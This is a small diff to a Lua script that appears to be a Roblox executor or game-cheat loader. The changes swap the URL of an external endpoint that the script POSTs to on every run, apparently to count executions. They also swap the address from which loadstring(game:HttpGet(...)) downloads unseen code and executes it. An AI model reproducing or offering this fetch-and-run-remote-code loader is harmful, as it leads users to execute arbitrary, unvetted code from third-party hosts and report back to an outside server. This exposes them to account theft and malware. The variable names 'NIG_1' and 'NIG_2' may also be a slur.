@@ -1,6 +1,6 @@
 local NIG_1, NIG_2 = pcall(function()
     return http_request({
-        Url = "https://python-4q69.onrender.com/totalexecute",
+        Url = "https://minhnghia.pythonanywhere.com/totalexecute",
         Method = "POST"
     })
     end)
@@ -9,4 +9,4 @@ local NIG_1, NIG_2 = pcall(function()
     else
         print(NIG_2)
     end
-loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/844a028ebc57479c"))()
+loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/24667fe4ce724af8"))()
